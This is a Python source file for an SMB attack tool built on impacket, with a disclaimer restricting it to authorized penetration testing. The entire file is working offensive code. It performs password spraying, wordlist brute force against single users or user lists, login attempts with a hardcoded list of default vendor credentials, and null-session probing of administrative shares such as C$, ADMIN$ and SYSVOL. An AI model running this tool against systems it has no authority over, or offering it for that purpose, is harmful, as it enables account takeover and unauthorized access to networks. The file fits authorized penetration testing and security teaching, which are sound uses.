# Author: 0xalwayslucky (https://github.com/0xalwayslucky)
#
# This script should be used for authorized penetration testing purposes only.
# Any misuse will not be the responsibility of the author and thus the author can't
# be held liable for any damages arising from this software
#
# References:
# https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/impacket/smbconnection.py
import argparse
import time

from impacket.smbconnection import SMBConnection, SessionError

debug = False


class SmbBruteForcer(object):

    default_shares = [
        'IPC$',
        'C$',
        'D$',
        'FAX$',
        'PRINT$'
        'ADMIN$',
        'NETLOGON',
        'SYSVOL',

    ]

    default_credentials = {
        '': '',
        'guest': '',
        'Administrator': ['', 'password', 'administrator', 'admin'],
        'admin': ['', 'password', 'administrator', 'admin'],
        'arcserve': ['arcserve', 'backup'],
        'tivoli': ['tivoli', 'tmersrvd', 'admin'],
        'tmersrvd': ['tivoli', 'tmersrvd', 'admin'],
        'backupexec': ['backupexec', 'backup', 'arcada'],
        'backup': ['backupexec', 'backup', 'arcada'],
        'test': ['password', 'test', 'lab', 'demo'],
        'lab': ['password', 'test', 'lab', 'demo'],
        'demo': ['password', 'test', 'lab', 'demo'],
    }

    def __init__(self, host, port):
        self.session = SMBConnection(
            remoteHost=host, remoteName=host, sess_port=port)
        self.host = host
        self.port = port
        self.timeout_wait = 30

    # check credentials of user
    def bf_user_pass(self, username, password):
        try:
            self.session.login(username, password)
            # this also could be done with self.session.getCredentials()
            print(f'{username}:{password}')
        except SessionError as se:
            nt_error, message = se.getErrorString()

            if nt_error == "STATUS_PASSWORD_MUST_CHANGE":
                print(f'({nt_error}) {username}:{password}')
            elif nt_error == "STATUS_ACCOUNT_LOCKED_OUT":
                print(f'{nt_error}: {username}')
            elif nt_error == "STATUS_IO_TIMEOUT":
                print(
                    f'{nt_error}: {message} sleeping for {self.timeout_wait} seconds.')
                time.sleep(self.timeout_wait)
            elif debug:
                print(f'{nt_error}: {message}')

            pass
        except Exception as e:
            if 'Error occurs while reading from remote(104)' in str(e):
                self.session.close()
                self.session = SMBConnection(
                    remoteHost=self.host, remoteName=self.host, sess_port=self.port)
                self.bf_user_pass(username, password)
            print(str(e))

    # password spraying approach
    def bf_userlist_pass(self, userlist, password):
        try:
            f = open(userlist, 'r')
            userlist = [user.strip() for user in f.readlines()]
            f.close()

            for user in userlist:
                self.bf_user_pass(user, password)

        except Exception as e:
            print(str(e))

    # brute-force user against wordlist
    def bf_user_wordlist(self, username, wordlist):
        try:
            f = open(wordlist, 'r')
            wordlist = [word.strip() for word in f.readlines()]
            f.close()

            for word in wordlist:
                self.bf_user_pass(username, word)

        except Exception as e:
            print(str(e))

    # brute-force each user from userlist with each word from wordlist
    def bf_userlist_passlist(self, userlist, wordlist):
        try:
            f = open(userlist, 'r')
            userlist = [user.strip() for user in f.readlines()]
            f.close()

            for user in userlist:
                self.bf_user_wordlist(user, wordlist)

        except Exception as e:
            print(str(e))

    # lets see if we are lucky shall we? brute-force well-known default credentials
    def bf_lucky(self):
        for index, (user, passwords) in enumerate(self.default_credentials.items()):
            if type(passwords) is list:
                for password in passwords:
                    self.bf_user_pass(user, password)
            else:
                self.bf_user_pass(user, passwords)

    # try to establish a conneciton to given share with a smb 'nullsession'
    def check_null_share(self, share):
        try:
            self.session.login('', '')
            self.session.connectTree(share)
            print(f'[+] Null session for: {share}')
        except SessionError as se:
            nt_error, message = se.getErrorString()

            if nt_error == "STATUS_IO_TIMEOUT":
                print(
                    f'{nt_error}: {message} sleeping for {self.timeout_wait} seconds.')
                time.sleep(self.timeout_wait)
            elif debug:
                print(f'{nt_error}: {message}')

            pass

    # check 'nullsession' for multiple shares
    def check_null_shares(self, shares):
        for share in shares:
            self.check_null_share(share)

    # check 'nullsession' for defined default shares
    def check_null_default(self):
        for share in self.default_shares:
            self.check_null_share(share)


# Todo: errors for arguments that are required are not printed properly
parser = argparse.ArgumentParser()
subparser = parser.add_subparsers()
parser.add_argument(
    '-H', '--host', help='host of the target smb server', required=True)
parser.add_argument(
    '-P', '--port', help='port of the target smb server', required=True)
parser.add_argument('-debug', help='print debug information e.g. erros',
                    required=False, action='store_true')

brute_parser = subparser.add_parser('brute')
group_brute = brute_parser.add_argument_group()
group_brute.add_argument(
    '-defaultbrute', help='use well-known default credentials for brute forcing', action='store_true')
group_user = group_brute.add_mutually_exclusive_group(required=False)
group_pass = group_brute.add_mutually_exclusive_group(required=False)
group_user.add_argument('-u', '--username', help='username to brute force')
group_user.add_argument('-U', '--userlist', help='userlist to brute force')
group_pass.add_argument('-p', '--password', help='password to use')
group_pass.add_argument('-w', '--wordlist', help='wordlist to use')

checknull_parser = subparser.add_parser('checknull')
group_null = checknull_parser.add_mutually_exclusive_group(required=False)
checknull_parser.add_argument(
    '-defaultshares', help='check well-known default shares', action='store_true', required=False)
group_null.add_argument('-s', '--share', help='share to check', required=False)
group_null.add_argument(
    '-S', '--shares', help='shares to check', required=False)


args = parser.parse_args()
brute_forcer = SmbBruteForcer(args.host, args.port)

if args.debug:
    debug = True

# checknull parser arguments
try:
    if args.share:
        brute_forcer.check_null_share(share=args.share)
    elif args.shares:
        brute_forcer.check_null_shares(shares=args.shares)
    elif args.defaultshares:
        brute_forcer.check_null_default()
except Exception as e:
    pass

# brute parser arguments
try:
    if args.username and args.password:
        brute_forcer.bf_user_pass(
            username=args.username, password=args.password)
    elif args.userlist and args.password:
        brute_forcer.bf_userlist_pass(
            userlist=args.userlist, password=args.password)
    elif args.username and args.wordlist:
        brute_forcer.bf_user_wordlist(
            username=args.username, wordlist=args.wordlist)
    elif args.userlist and args.wordlist:
        brute_forcer.bf_userlist_passlist(
            userlist=args.userlist, wordlist=args.wordlist)
    elif args.defaultbrute:
        brute_forcer.bf_lucky()
except Exception as e:
    pass
